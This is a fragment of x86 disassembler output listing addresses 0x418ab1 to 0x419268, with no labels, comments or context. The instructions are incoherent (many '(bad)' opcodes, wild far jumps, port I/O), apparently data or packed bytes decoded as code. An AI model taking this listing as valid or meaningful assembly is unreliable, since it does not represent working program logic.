  418ab1:	sbb    ebp,edi
  418ab3:	nop
  418ab4:	gs lock mov ah,0x8b
  418ab8:	pop    ebp
  418ab9:	int    0x4c
  418abb:	into   
  418abc:	shr    eax,0xff
  418abf:	push   0xffffffcb
  418ac1:	aas    
  418ac2:	inc    ebx
  418ac3:	jne    0x418afe
  418ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ac6:	cld    
  418ac7:	sti    
  418ac8:	jnp    0x418b15
  418aca:	jle    0x418af9
  418acc:	imul   ebx,DWORD PTR [esi],0x2e
  418acf:	in     al,dx
  418ad0:	push   esi
  418ad1:	cmp    al,0x61
  418ad3:	enter  0x8e98,0x32
  418ad7:	inc    esi
  418ad8:	push   0xfffffff5
  418ada:	cld    
  418adb:	push   eax
  418adc:	ret    
  418add:	pushf  
  418ade:	sbb    eax,0x33ea2839
  418ae3:	rcr    DWORD PTR [edi+0x72],cl
  418ae6:	xor    BYTE PTR [edx],dl
  418ae8:	data16 or bl,BYTE PTR [ebx-0x119bac58]
  418aef:	sub    ebp,esp
  418af1:	sub    BYTE PTR [edx],cl
  418af3:	lahf   
  418af4:	xchg   DWORD PTR [edx],ecx
  418af6:	dec    ebp
  418af7:	pop    edi
  418af8:	aaa    
  418af9:	xor    cl,BYTE PTR [edi]
  418afb:	loopne 0x418af8
  418afd:	mov    bh,0xd0
  418aff:	or     dh,0xed
  418b02:	xchg   edi,eax
  418b03:	enter  0xd371,0xab
  418b07:	mov    DWORD PTR [edx+0x0],ecx
  418b0a:	add    BYTE PTR [eax+0xc],cl
  418b0d:	adc    al,0x91
  418b0f:	or     bh,BYTE PTR [esp+eiz*2+0x14]
  418b13:	adc    dl,ah
  418b15:	pop    ecx
  418b16:	add    ebx,edx
  418b18:	lock in al,0x89
  418b1b:	mov    al,0xeb
  418b1d:	xchg   edi,eax
  418b1e:	jne    0x418abc
  418b20:	int3   
  418b21:	push   0xfffffffd
  418b23:	popa   
  418b24:	lds    ebp,FWORD PTR [eax-0x70b121f5]
  418b2a:	ror    al,0x24
  418b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2e:	jnp    0x418ac1
  418b30:	scas   al,BYTE PTR es:[edi]
  418b31:	call   0x6a2ca1fc
  418b36:	cld    
  418b37:	mov    eax,ds:0x1200c86d
  418b3c:	mov    dl,0x9
  418b3e:	ins    DWORD PTR es:[edi],dx
  418b3f:	fnstenv [esi-0x45]
  418b42:	xchg   dh,cl
  418b44:	fld    QWORD PTR [eax-0x196cb103]
  418b4a:	es cmp eax,0xf8dab6ec
  418b50:	inc    ebx
  418b51:	dec    esi
  418b52:	adc    esp,DWORD PTR [ebx+edx*1]
  418b55:	sub    ch,dh
  418b57:	mov    ch,0xad
  418b59:	cli    
  418b5a:	fwait
  418b5b:	(bad)  
  418b5c:	xor    BYTE PTR [edi+eax*4-0x65],dh
  418b60:	fidiv  DWORD PTR [edx-0x746ca66c]
  418b66:	std    
  418b67:	inc    eax
  418b68:	jge    0x418b95
  418b6a:	call   0x4ac8:0xac9ca9ab
  418b71:	ja     0x418bbc
  418b73:	retf   0x6140
  418b76:	test   al,0x9e
  418b78:	loop   0x418b0b
  418b7a:	rcr    BYTE PTR [eax+edi*2+0x5f],1
  418b7e:	push   edx
  418b7f:	arpl   dx,si
  418b81:	popf   
  418b82:	adc    BYTE PTR [esi+0x1ac6dffa],al
  418b88:	sar    al,1
  418b8a:	mov    edx,0x5d2410
  418b8f:	push   0xffffff9d
  418b91:	pop    edx
  418b92:	and    cl,0x88
  418b95:	outs   dx,BYTE PTR ds:[esi]
  418b96:	stos   DWORD PTR es:[edi],eax
  418b97:	test   al,0x9b
  418b99:	mov    cl,0x90
  418b9b:	enter  0xd76d,0x7
  418b9f:	ror    DWORD PTR [esi],cl
  418ba1:	in     eax,dx
  418ba2:	jne    0x418bb6
  418ba4:	jmp    0x418b3e
  418ba6:	int    0x9f
  418ba8:	xor    BYTE PTR [eax-0x2e27c498],ah
  418bae:	and    cl,al
  418bb0:	jbe    0x418b71
  418bb2:	dec    esi
  418bb3:	mov    al,0xad
  418bb5:	jecxz  0x418bc3
  418bb7:	iret   
  418bb8:	std    
  418bb9:	aaa    
  418bba:	jle    0x418b3e
  418bbc:	stos   BYTE PTR es:[edi],al
  418bbd:	aam    0x64
  418bbf:	mov    ds:0xfa0b1f32,al
  418bc4:	jo     0x418ba5
  418bc6:	cmp    esi,DWORD PTR [esi]
  418bc8:	lahf   
  418bc9:	sahf   
  418bca:	sti    
  418bcb:	dec    ebp
  418bcc:	loope  0x418ba0
  418bce:	cld    
  418bcf:	icebp  
  418bd0:	dec    ebp
  418bd1:	nop
  418bd2:	adc    DWORD PTR [eax],edx
  418bd4:	test   BYTE PTR [edx+edi*4-0x358dc20],bh
  418bdb:	nop
  418bdc:	dec    esi
  418bdd:	not    DWORD PTR [esi-0x5a]
  418be0:	xor    eax,0x94cafd56
  418be5:	lods   al,BYTE PTR ds:[esi]
  418be6:	fcmovbe st,st(1)
  418be8:	test   eax,0x91bd7411
  418bed:	jp     0x418c31
  418bef:	cmp    al,0x29
  418bf1:	xchg   esp,eax
  418bf2:	bound  ecx,QWORD PTR [edx-0xc]
  418bf5:	mov    esi,0x7f76cdfc
  418bfa:	ds arpl WORD PTR ss:[edi-0x1014c562],bx
  418c02:	xor    cl,BYTE PTR [ebx-0x48]
  418c05:	fstp   DWORD PTR [esp+eax*2-0x38a41473]
  418c0c:	ds loopne 0x418bd9
  418c0f:	repz mov al,0x4f
  418c12:	inc    esp
  418c13:	mov    eax,eax
  418c15:	adc    ch,bh
  418c17:	push   edx
  418c18:	inc    edi
  418c19:	xchg   ebx,eax
  418c1a:	xor    al,0x94
  418c1c:	bound  edx,QWORD PTR [edx]
  418c1e:	xor    ecx,eax
  418c20:	lea    edi,[edx]
  418c22:	lock daa 
  418c24:	dec    eax
  418c25:	dec    esi
  418c26:	jl     0x418ca7
  418c28:	jmp    0x418c75
  418c2a:	inc    eax
  418c2b:	jmp    0x418c2c
  418c2d:	or     edx,edx
  418c2f:	mov    WORD PTR [eax],gs
  418c31:	or     BYTE PTR [eax],cl
  418c33:	sub    bl,0x66
  418c36:	sub    cl,dl
  418c38:	test   eax,0xeb919a70
  418c3d:	xchg   ebx,eax
  418c3e:	xchg   ecx,eax
  418c3f:	xchg   edx,eax
  418c40:	ja     0x418c67
  418c42:	les    edx,FWORD PTR [esp+ebp*4-0x1408b8fb]
  418c49:	aam    0x9d
  418c4b:	fnsave [edi+esi*8+0x3c]
  418c4f:	(bad)  
  418c50:	jmp    0x418c7d
  418c52:	sti    
  418c53:	jae    0x418c9e
  418c55:	sbb    ah,BYTE PTR [edi-0x7]
  418c58:	mov    ebx,0x9e92aedf
  418c5d:	xor    eax,0xe081e18b
  418c62:	cld    
  418c63:	and    esp,eax
  418c65:	icebp  
  418c66:	xor    bh,ah
  418c68:	sbb    al,0x79
  418c6a:	mov    eax,ecx
  418c6c:	adc    cl,ah
  418c6e:	gs das 
  418c70:	jbe    0x418ce9
  418c72:	cmp    DWORD PTR [ebx-0x15],edi
  418c75:	shl    cl,1
  418c77:	fnstenv [ecx+0x1cd42d2a]
  418c7d:	loopne 0x418c52
  418c7f:	sti    
  418c80:	pop    ebx
  418c81:	xlat   BYTE PTR ds:[ebx]
  418c82:	aad    0xa6
  418c84:	xor    eax,0x6086a9df
  418c89:	repz push DWORD PTR [ecx+0x795a5415]
  418c90:	lds    edx,FWORD PTR [edi]
  418c92:	lds    eax,FWORD PTR [ebp+0x12]
  418c95:	fbld   TBYTE PTR [esi-0x12d5617b]
  418c9b:	xchg   ebx,esi
  418c9d:	mov    cl,0xfc
  418c9f:	mov    ecx,0x74de2d41
  418ca4:	outs   dx,BYTE PTR ds:[esi]
  418ca5:	leave  
  418ca6:	aas    
  418ca7:	mov    eax,ds:0x2ca1df61
  418cac:	jb     0x418d12
  418cae:	pushf  
  418caf:	adc    eax,0xd2ffddad
  418cb4:	fld    DWORD PTR fs:[esi]
  418cb7:	aam    0x2a
  418cb9:	dec    edi
  418cba:	pusha  
  418cbb:	sub    DWORD PTR [ecx+0x283430df],ebx
  418cc1:	inc    ebx
  418cc2:	push   edx
  418cc3:	pop    ebx
  418cc4:	lods   al,BYTE PTR ds:[esi]
  418cc5:	add    edi,ebp
  418cc7:	shr    BYTE PTR [edx-0x26be738f],1
  418ccd:	sbb    ebx,edi
  418ccf:	fnsave [ebp-0x450882bf]
  418cd5:	ror    BYTE PTR [edi+0xc74a48a],cl
  418cdb:	mov    al,ds:0xd9fd5c4f
  418ce0:	sar    esi,cl
  418ce2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce4:	(bad)  
  418ce6:	es pop edi
  418ce8:	lahf   
  418ce9:	out    dx,al
  418cea:	jl     0x418cc2
  418cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ced:	jl     0x418cc8
  418cef:	mov    esp,0x12fd6f82
  418cf4:	jecxz  0x418d11
  418cf6:	retf   0xb830
  418cf9:	fadd   st,st(7)
  418cfb:	xor    ecx,edi
  418cfd:	mov    bh,BYTE PTR [ebp+0x5640d5b6]
  418d03:	cdq    
  418d04:	jmp    0x418c93
  418d06:	push   edi
  418d07:	mov    edi,0x16e72bee
  418d0c:	test   eax,0x865b1d4
  418d11:	addr16 std 
  418d13:	mov    gs,WORD PTR [eax]
  418d15:	sub    BYTE PTR [edx-0x7409143c],ah
  418d1b:	jl     0x418cab
  418d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d1e:	inc    edi
  418d1f:	adc    eax,0x88e2e886
  418d24:	les    ebx,FWORD PTR [edi]
  418d26:	dec    esp
  418d27:	out    dx,al
  418d28:	icebp  
  418d29:	adc    eax,edi
  418d2b:	mov    ds:0xc27a76eb,eax
  418d30:	shr    DWORD PTR fs:[eax+0x3fdf20b8],cl
  418d37:	popf   
  418d38:	ins    DWORD PTR es:[edi],dx
  418d39:	sbb    DWORD PTR [ecx-0x26cd477],esp
  418d3f:	mov    esp,0x4c031e98
  418d44:	sbb    BYTE PTR [esi-0x2c],bl
  418d47:	jg     0x418d70
  418d49:	pop    ebx
  418d4a:	std    
  418d4b:	add    BYTE PTR [eax+0x7cb1b68],al
  418d51:	test   al,0xfc
  418d53:	out    0x64,al
  418d55:	jo     0x418da1
  418d57:	arpl   WORD PTR [eax+0x3b],si
  418d5a:	rol    edi,1
  418d5c:	push   ebp
  418d5d:	and    bl,cl
  418d5f:	mov    edx,0x3f1335e6
  418d64:	jmp    0x418dd0
  418d66:	scas   eax,DWORD PTR es:[edi]
  418d67:	mov    al,0x22
  418d69:	inc    edi
  418d6a:	sub    al,0x1e
  418d6c:	mov    al,0x67
  418d6e:	fstp   QWORD PTR [ebx]
  418d70:	jl     0x418d51
  418d72:	cmp    DWORD PTR [esp+ebx*8],ecx
  418d75:	sbb    al,0xbd
  418d77:	test   eax,0x14fd3954
  418d7c:	sub    al,dl
  418d7e:	popa   
  418d7f:	fld    QWORD PTR [ecx-0x2c437d10]
  418d85:	sbb    ebp,DWORD PTR [ecx+ecx*2-0x26]
  418d89:	scas   eax,DWORD PTR es:[edi]
  418d8a:	push   0xffffff9c
  418d8c:	mov    ah,0x37
  418d8e:	mov    edx,eax
  418d90:	jmp    0x418e0a
  418d92:	into   
  418d93:	rcr    DWORD PTR [ecx],cl
  418d95:	push   ebp
  418d96:	mov    ds:0x3eebc7af,eax
  418d9b:	cmp    eax,0xb5be637b
  418da0:	pop    ecx
  418da1:	pop    ds
  418da2:	loop   0x418d4b
  418da4:	pushf  
  418da5:	xchg   edx,eax
  418da6:	std    
  418da7:	enter  0x5937,0xd
  418dab:	jl     0x418db3
  418dad:	in     al,dx
  418dae:	(bad)  
  418daf:	into   
  418db0:	lods   al,BYTE PTR ds:[esi]
  418db1:	imul   esp,DWORD PTR [ebx-0x8],0xffffffcb
  418db5:	jbe    0x418d3a
  418db7:	shl    DWORD PTR [ecx+0x70ab4d35],cl
  418dbd:	push   0xfffffff9
  418dbf:	ja     0x418d9e
  418dc1:	dec    ecx
  418dc2:	xchg   BYTE PTR [edx+0x6b],dl
  418dc5:	mov    gs,esi
  418dc7:	pop    ss
  418dc8:	aad    0xdf
  418dca:	rdtsc  
  418dcc:	jle    0x418dc1
  418dce:	pop    ebp
  418dcf:	mov    esi,0x94fd0b46
  418dd4:	mov    ch,0x47
  418dd6:	cmp    BYTE PTR [esi+edi*8],bl
  418dd9:	xor    BYTE PTR [edx],dl
  418ddb:	leave  
  418ddc:	push   edi
  418ddd:	fsub   QWORD PTR [ebp+0x9]
  418de0:	and    BYTE PTR [eax-0x43],0xa8
  418de4:	push   ds
  418de5:	mov    cl,0xfc
  418de7:	sbb    al,0xf1
  418de9:	das    
  418dea:	out    dx,al
  418deb:	dec    ecx
  418dec:	not    bl
  418dee:	jb     0x418db8
  418df0:	xchg   ebp,eax
  418df1:	sbb    esp,eax
  418df3:	inc    esp
  418df4:	pusha  
  418df5:	iret   
  418df6:	mov    edx,0x580ceb42
  418dfb:	repz call 0xb3dc:0xd475fa3e
  418e03:	mov    ds:0x6f97153b,eax
  418e08:	adc    edx,eax
  418e0a:	and    BYTE PTR [edx+0x101ed9eb],dl
  418e10:	adc    esi,DWORD PTR [eax]
  418e12:	cmp    cl,BYTE PTR [eax+0x737dffa]
  418e18:	xlat   BYTE PTR ds:[ebx]
  418e19:	retf   0x6d25
  418e1c:	dec    edi
  418e1d:	fwait
  418e1e:	cld    
  418e1f:	sub    eax,DWORD PTR [eax]
  418e21:	imul   edi,DWORD PTR [ecx*2-0x36499e14],0xd2e0ac08
  418e2c:	popa   
  418e2d:	sti    
  418e2e:	mov    al,ds:0xe1d7a818
  418e33:	jns    0x418dd8
  418e35:	pop    esi
  418e36:	pop    ecx
  418e37:	outs   dx,DWORD PTR ds:[esi]
  418e38:	scas   al,BYTE PTR es:[edi]
  418e39:	into   
  418e3a:	mov    cl,BYTE PTR [edi]
  418e3c:	fwait
  418e3d:	push   edx
  418e3e:	dec    eax
  418e3f:	enter  0x8a57,0xd7
  418e43:	xchg   ebx,eax
  418e44:	sbb    DWORD PTR [esi+0x8],0x7c1beb18
  418e4b:	fbstp  TBYTE PTR [esi]
  418e4d:	jne    0x418ea2
  418e4f:	shr    ebp,1
  418e51:	fistp  WORD PTR [esi-0x79ba0e69]
  418e57:	sbb    bh,BYTE PTR [eax+ebp*8-0x4]
  418e5b:	ffreep st(2)
  418e5d:	test   DWORD PTR [ebp+0x7b3e1094],ebx
  418e63:	enter  0x8154,0xef
  418e67:	xlat   BYTE PTR ds:[ebx]
  418e68:	(bad)  
  418e69:	(bad)  
  418e6a:	mov    ecx,DWORD PTR [edi-0x716c5006]
  418e70:	jmp    0x418ed1
  418e72:	jae    0x418e98
  418e74:	xchg   ebp,eax
  418e75:	pop    ds
  418e76:	xchg   ecx,eax
  418e77:	enter  0x1dd7,0xa3
  418e7b:	mov    cl,0x16
  418e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e7e:	fist   WORD PTR [ebx+ebp*8+0x33]
  418e82:	jl     0x418e89
  418e84:	inc    ecx
  418e85:	loope  0x418e39
  418e87:	or     ecx,DWORD PTR [eax+0x721207de]
  418e8d:	adc    al,0x5e
  418e8f:	mov    ?,WORD PTR fs:[ebx]
  418e92:	loope  0x418f10
  418e94:	fld    QWORD PTR [ecx-0x4d3c6a8a]
  418e9a:	add    eax,0x3942bc8
  418e9f:	test   ecx,ecx
  418ea1:	inc    ecx
  418ea2:	addr16 enter 0xfe27,0x31
  418ea7:	inc    ebx
  418ea8:	jno    0x418ea3
  418eaa:	mov    DWORD PTR [ecx-0x22b3cce6],0x1d3b7deb
  418eb4:	push   esp
  418eb5:	mov    dl,0x7f
  418eb7:	lahf   
  418eb8:	imul   ebx,edi,0xffffffd1
  418ebb:	out    dx,eax
  418ebc:	cmp    DWORD PTR [edx+ebp*1-0x343de4b],esp
  418ec3:	fst    DWORD PTR es:[edx+0x14]
  418ec7:	mov    BYTE PTR [esi-0x8314b8c],ch
  418ecd:	ret    
  418ece:	inc    ebp
  418ecf:	fwait
  418ed0:	retf   
  418ed1:	daa    
  418ed2:	cmp    ah,0xda
  418ed5:	fisub  DWORD PTR [eax+0x2c36eb18]
  418edb:	jmp    0x418e6a
  418edd:	scas   al,BYTE PTR es:[edi]
  418ede:	loopne 0x418f37
  418ee0:	cmc    
  418ee1:	fistp  QWORD PTR [esi+0x1d]
  418ee4:	sub    ecx,DWORD PTR [edx+0x12b35b34]
  418eea:	std    
  418eeb:	pusha  
  418eec:	out    0x45,al
  418eee:	sub    al,0xab
  418ef0:	inc    ecx
  418ef1:	push   ss
  418ef2:	les    edi,FWORD PTR [ebp+0x84befce]
  418ef8:	loopne 0x418f5e
  418efa:	lods   eax,DWORD PTR ds:[esi]
  418efb:	lock sub DWORD PTR [edi+edi*8-0x74f48f10],ebp
  418f03:	inc    edx
  418f04:	iret   
  418f05:	daa    
  418f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f07:	push   ds
  418f08:	adc    eax,0x4d22c3df
  418f0d:	xor    DWORD PTR [edi],edx
  418f0f:	ins    BYTE PTR es:[edi],dx
  418f10:	ins    BYTE PTR es:[edi],dx
  418f11:	mov    bl,0xb9
  418f13:	add    dh,dh
  418f15:	jg     0x418ed4
  418f17:	in     al,0x83
  418f19:	xchg   esp,eax
  418f1a:	lock (bad) 
  418f1c:	mov    edx,0xb0fc38c2
  418f21:	outs   dx,BYTE PTR ds:[esi]
  418f22:	push   edi
  418f23:	sub    esp,DWORD PTR [edx+ecx*8-0x4a32f904]
  418f2a:	retf   
  418f2b:	(bad)  
  418f2c:	lahf   
  418f2d:	repz xchg ecx,eax
  418f2f:	enter  0x1f05,0x87
  418f33:	cmp    ebp,DWORD PTR [ecx]
  418f35:	shr    DWORD PTR [esi],cl
  418f37:	or     esp,esi
  418f39:	test   DWORD PTR [eax-0x4e],ebp
  418f3c:	push   esi
  418f3d:	loope  0x418f1b
  418f3f:	jle    0x418ede
  418f41:	or     esp,edi
  418f43:	mov    DWORD PTR [eax-0x53],0x1bbdb82f
  418f4a:	push   ecx
  418f4b:	mov    ebx,0xe76cc7ea
  418f50:	mov    ds:0x563f1aa4,al
  418f55:	fmul   DWORD PTR [esi+ecx*2-0x37f93c66]
  418f5c:	jne    0x418f4b
  418f5e:	mov    ch,0x93
  418f60:	jl     0x418f31
  418f62:	jg     0x418f65
  418f64:	lahf   
  418f65:	cmp    bh,ch
  418f67:	scas   eax,DWORD PTR es:[edi]
  418f68:	je     0x418f16
  418f6a:	aas    
  418f6b:	mov    eax,ds:0xdf04ea3b
  418f70:	retf   0x3b8
  418f73:	xchg   ecx,eax
  418f74:	fwait
  418f75:	pop    edi
  418f76:	and    DWORD PTR [ebx],ebx
  418f78:	mov    DWORD PTR [edx],esi
  418f7a:	mov    bl,0x9f
  418f7c:	out    dx,al
  418f7d:	mov    cl,0x24
  418f7f:	jmp    0x56c28ed6
  418f84:	loopne 0x418f4a
  418f86:	dec    ebp
  418f87:	pusha  
  418f88:	xchg   ecx,eax
  418f89:	(bad)  
  418f8b:	dec    ecx
  418f8c:	mov    edi,0xd6fb6690
  418f91:	cmp    eax,0x84cb5cfd
  418f96:	es inc esp
  418f98:	pop    ss
  418f99:	test   eax,0x49b0c853
  418f9e:	mov    al,0xd5
  418fa0:	pop    ecx
  418fa1:	cmp    al,0x61
  418fa3:	and    ch,bl
  418fa5:	mov    ebp,0x720341b
  418faa:	adc    DWORD PTR [eax],esp
  418fac:	or     al,0xe0
  418fae:	jb     0x418fde
  418fb0:	push   ebx
  418fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb2:	in     eax,dx
  418fb3:	fsubr  DWORD PTR [ebx]
  418fb5:	popa   
  418fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb7:	or     bh,ch
  418fb9:	(bad)  
  418fba:	cld    
  418fbb:	sbb    bl,BYTE PTR [ebx-0x77]
  418fbe:	mov    cl,BYTE PTR [esi]
  418fc0:	daa    
  418fc1:	pop    eax
  418fc2:	test   al,cl
  418fc4:	jnp    0x419037
  418fc6:	fwait
  418fc7:	dec    ebp
  418fc8:	sub    DWORD PTR [ebx],edi
  418fca:	inc    eax
  418fcb:	add    eax,0xba379eeb
  418fd0:	push   ebx
  418fd1:	enter  0x21a6,0x6a
  418fd5:	loopne 0x418f58
  418fd7:	int    0x79
  418fd9:	mov    esp,0x9a4ae827
  418fde:	jmp    0xfcf7aeb
  418fe3:	in     eax,0x2f
  418fe5:	inc    eax
  418fe6:	or     al,0x99
  418fe8:	jecxz  0x418fc9
  418fea:	fsub   st(1),st
  418fec:	xlat   BYTE PTR ds:[ebx]
  418fed:	fld    QWORD PTR [eax-0x26a710c7]
  418ff3:	addr16 popf 
  418ff5:	xor    ebx,esi
  418ff7:	cmp    BYTE PTR cs:[edi+0x619fdc25],0x46
  418fff:	leave  
  419000:	jge    0x419002
  419002:	mov    ecx,0x25583dc5
  419007:	test   al,0x27
  419009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41900a:	cld    
  41900b:	sbb    eax,0xd3a21add
  419010:	pusha  
  419011:	xchg   esi,eax
  419012:	or     eax,0x803878de
  419017:	jge    0x419019
  419019:	js     0x41901c
  41901b:	jae    0x419038
  41901d:	sbb    cl,bh
  41901f:	xchg   edx,eax
  419020:	in     al,dx
  419021:	fnstenv [eax+edi*1+0x7f630192]
  419028:	fwait
  419029:	arpl   WORD PTR [eax-0x38],si
  41902c:	xchg   ebx,eax
  41902d:	push   ss
  41902e:	dec    esi
  41902f:	sub    ebx,DWORD PTR [edi]
  419031:	inc    eax
  419032:	xchg   ebp,eax
  419033:	jge    0x419020
  419035:	dec    eax
  419036:	int    0xd2
  419038:	and    eax,0xe27c6a14
  41903d:	jmp    0xc7d3:0x2ad22f2c
  419044:	sub    DWORD PTR [ebx*2+0xf436c1e],edi
  41904b:	add    DWORD PTR [ecx+0x68affb71],esi
  419051:	arpl   bp,bp
  419053:	int    0x24
  419055:	lock inc ecx
  419057:	mov    dl,0xb
  419059:	fs jmp 0xfd9eda35
  41905f:	add    DWORD PTR [edi-0x75],edi
  419062:	or     eax,0xf098346f
  419067:	fbld   TBYTE PTR [edx-0x64]
  41906a:	jl     0x419076
  41906c:	push   ecx
  41906d:	pop    ecx
  41906e:	pop    esp
  41906f:	mov    ds:0xa8fd495d,eax
  419074:	scas   al,BYTE PTR es:[di]
  419076:	ins    BYTE PTR es:[edi],dx
  419077:	mov    al,fs:0x43be31c3
  41907d:	imul   edi,edx,0x7
  419080:	mov    eax,0x2c125a94
  419085:	jae    0x419084
  419087:	xchg   edi,eax
  419088:	out    0x6a,al
  41908a:	push   ebx
  41908b:	fcmovnu st,st(5)
  41908d:	out    0x3f,al
  41908f:	retf   
  419090:	add    DWORD PTR [eax],0x29
  419093:	(bad)  
  419094:	vhaddps xmm4,xmm0,XMMWORD PTR [edi+0x19]
  419099:	es in  eax,0x81
  41909c:	sub    al,BYTE PTR [edi+edx*2+0x5a2a4bc8]
  4190a3:	inc    eax
  4190a4:	jmp    0x460ff270
  4190a9:	xchg   edi,eax
  4190aa:	shl    BYTE PTR [esp+ebp*8+0x1bfdd29b],0x3b
  4190b2:	aaa    
  4190b3:	push   0xe7f68eea
  4190b8:	mov    eax,0x3e68430a
  4190bd:	mov    ah,0xf0
  4190bf:	(bad)  
  4190c0:	stos   BYTE PTR es:[edi],al
  4190c1:	sbb    ch,dh
  4190c3:	or     cl,BYTE PTR [edi+edi*2-0x5314e38d]
  4190ca:	lods   al,BYTE PTR ds:[esi]
  4190cb:	sub    dh,dh
  4190cd:	jmp    0xb7f7:0xdf382bfa
  4190d4:	jo     0x4190ae
  4190d6:	jmp    0xfd2f4f61
  4190db:	pop    es
  4190dc:	popf   
  4190dd:	pop    ebp
  4190de:	xor    al,bh
  4190e0:	xor    esp,esp
  4190e2:	sub    al,0xbe
  4190e4:	sbb    DWORD PTR [ebx+0x5f6f7f93],ecx
  4190ea:	(bad)
  4190ed:	fdivr  QWORD PTR [ebp+0x522cedce]
  4190f3:	cmc    
  4190f4:	(bad)  
  4190f5:	(bad)  
  4190f6:	jg     0x41912f
  4190f8:	push   edx
  4190f9:	imul   edi,esi,0xffffffcd
  4190fc:	loopne 0x4190e4
  4190fe:	push   eax
  4190ff:	mov    ebp,0x11cddeb
  419104:	jnp    0x419088
  419106:	sub    DWORD PTR [ecx-0xa],esi
  419109:	rcl    DWORD PTR [edi],1
  41910b:	xchg   ebx,ebp
  41910d:	(bad)  
  41910e:	jmp    0x143c6a27
  419113:	retf   
  419114:	test   DWORD PTR [edi+0x70],eax
  419117:	test   al,0xea
  419119:	jbe    0x4190d8
  41911b:	call   0x4cc0:0xdefd15a5
  419122:	fwait
  419123:	adc    BYTE PTR [ecx+0x2cdc3c7c],bh
  419129:	ins    BYTE PTR es:[edi],dx
  41912a:	jge    0x4190dc
  41912c:	shl    BYTE PTR [ecx+0x2f],1
  41912f:	retf   0xd045
  419132:	cld    
  419133:	or     eax,0x5cbf4c78
  419138:	add    bl,BYTE PTR fs:0xb4c53ec8
  41913f:	pop    eax
  419140:	sub    BYTE PTR [ecx+0x6c],ch
  419143:	push   0x840929e7
  419148:	ror    BYTE PTR [ebx+0x7d],0x8d
  41914c:	sti    
  41914d:	popa   
  41914e:	leave  
  41914f:	retf   0x8286
  419152:	jmp    0x419177
  419154:	mov    al,ds:0x39c7bccf
  419159:	daa    
  41915a:	std    
  41915b:	mov    cs,WORD PTR cs:[esi]
  41915e:	loopne 0x4190e8
  419160:	mov    DWORD PTR [edi],ebx
  419162:	stos   BYTE PTR es:[edi],al
  419163:	mov    bh,0x9a
  419165:	lahf   
  419166:	gs enter 0xb15f,0x5a
  41916b:	in     al,0x23
  41916d:	gs test esp,edi
  419170:	in     al,0x39
  419172:	cmp    al,cl
  419174:	aaa    
  419175:	xchg   edx,eax
  419176:	and    cl,cl
  419178:	inc    esi
  419179:	and    al,cl
  41917b:	enter  0x4eac,0xb7
  41917f:	dec    ecx
  419180:	fnstsw WORD PTR ds:0x17eb344c
  419186:	cmp    BYTE PTR [ebp-0x2c],dl
  419189:	inc    ebp
  41918a:	mov    ecx,0xece0b8d6
  41918f:	mov    ecx,0x98229b83
  419194:	icebp  
  419195:	ins    DWORD PTR es:[edi],dx
  419196:	(bad)  
  419197:	std    
  419198:	jmp    0x4191a1
  41919a:	int    0xb2
  41919c:	ficom  DWORD PTR [eax+0x4e]
  41919f:	in     al,0x52
  4191a1:	ffreep st(6)
  4191a3:	mov    bh,0xc8
  4191a5:	in     al,dx
  4191a6:	cmp    ecx,DWORD PTR [ecx-0x3f034b7b]
  4191ac:	sub    eax,0x36517ba1
  4191b1:	mov    edx,ebp
  4191b3:	shl    ah,cl
  4191b5:	and    dl,BYTE PTR [ebx-0x41]
  4191b8:	imul   ebx,DWORD PTR [ebp+ecx*4-0x2d],0xfffffff8
  4191bd:	lds    esp,FWORD PTR [ecx+ebp*8+0x328755eb]
  4191c4:	cmp    dl,BYTE PTR [ebx-0xc]
  4191c7:	sbb    cl,cl
  4191c9:	fild   QWORD PTR [edx]
  4191cb:	push   cs
  4191cc:	and    BYTE PTR [ecx+0x102f7007],al
  4191d2:	add    BYTE PTR [edx-0x6],ah
  4191d5:	cmp    edx,ebp
  4191d7:	mov    bl,0x50
  4191d9:	push   edi
  4191da:	mov    ds:0x25ebc193,eax
  4191df:	in     al,dx
  4191e0:	adc    eax,0x8e0efa5e
  4191e5:	adc    BYTE PTR [ecx+eiz*1+0x13],ch
  4191e9:	cmp    esi,DWORD PTR [eax-0x7a]
  4191ec:	jmp    0x419194
  4191ee:	add    ah,ch
  4191f0:	add    eax,0x692e91
  4191f5:	fstp   DWORD PTR [edi]
  4191f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191f8:	cdq    
  4191f9:	sbb    ebx,ebp
  4191fb:	pop    esp
  4191fc:	sbb    ecx,DWORD PTR [edx]
  4191fe:	stos   DWORD PTR es:[edi],eax
  4191ff:	or     DWORD PTR [ebx],0xd60fd1a
  419205:	iret   
  419206:	or     dh,dh
  419208:	jbe    0x419242
  41920a:	pop    eax
  41920b:	enter  0x222c,0x8b
  41920f:	mov    esi,?
  419211:	inc    edi
  419212:	pusha  
  419213:	shr    ah,1
  419215:	fdiv   DWORD PTR [ebp+0x7a]
  419218:	dec    ebp
  419219:	loope  0x419236
  41921b:	(bad)  
  41921d:	mov    eax,0x3415cf94
  419222:	ss call 0xd4a2a7d3
  419228:	test   eax,0x4380fd7e
  41922d:	pop    ds
  41922e:	xchg   edx,eax
  41922f:	in     eax,0x3e
  419231:	or     DWORD PTR [ebx],eax
  419233:	js     0x419261
  419235:	inc    edi
  419236:	cdq    
  419237:	enter  0x5414,0x30
  41923b:	ins    BYTE PTR es:[edi],dx
  41923c:	inc    esi
  41923d:	pop    esp
  41923e:	ins    BYTE PTR es:[edi],dx
  41923f:	xchg   ecx,eax
  419240:	jmp    0x4192ae
  419242:	loopne 0x4192c2
  419244:	push   ecx
  419245:	or     dl,BYTE PTR [edi+ecx*2+0x6818df78]
  41924c:	cwde   
  41924d:	mov    BYTE PTR [ebx],ch
  41924f:	xor    al,0x2a
  419251:	push   ebx
  419252:	std    
  419253:	in     al,dx
  419254:	cmp    eax,0x723b27d
  419259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41925a:	into   
  41925b:	enter  0x1629,0x32
  41925f:	test   al,0xec
  419261:	sbb    esi,DWORD PTR [ecx]
  419263:	sbb    eax,0x2d3323eb
  419268:	iret   
